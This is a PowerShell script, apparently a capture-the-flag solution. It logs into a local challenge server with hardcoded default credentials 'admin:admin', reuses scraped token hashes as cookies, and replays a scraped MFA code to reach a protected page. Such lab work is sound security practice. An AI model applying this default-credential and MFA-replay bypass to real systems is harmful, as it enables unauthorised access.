# Fetch the content from the URL
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
} -UseBasicParsing

# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
$filteredContent = $response.Content -split "`n" | Where-Object { 
    $_ -notmatch "REDACTED" -and 
    $_ -notmatch "#" -and 
    $_ -notmatch "file_MD5hash" -and 
    $_ -notmatch "Sha256\(file_MD5hash\)" 
}

# Convert the filtered lines into an object (in-memory CSV structure)
$csvData = $filteredContent | ForEach-Object {
    $fields = $_ -split ","  # Split each line by commas into an array of fields
    [PSCustomObject]@{
        Column1 = $fields[0]
        Column2 = $fields[1]
    }
}

$sha256Sum = $csvData.Column2
$md5Sum = $csvData.Column1

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "token=$md5Sum"
} -UseBasicParsing

$time_code = [regex]::match($response.Content,"href='(.+)'").Groups[1].Value
$urlpath = [regex]::match($response.Content,"'>(.+)</a>").Groups[1].Value

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225$urlpath" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "mfa_code=$time_code; token=$md5Sum"
} -UseBasicParsing

$response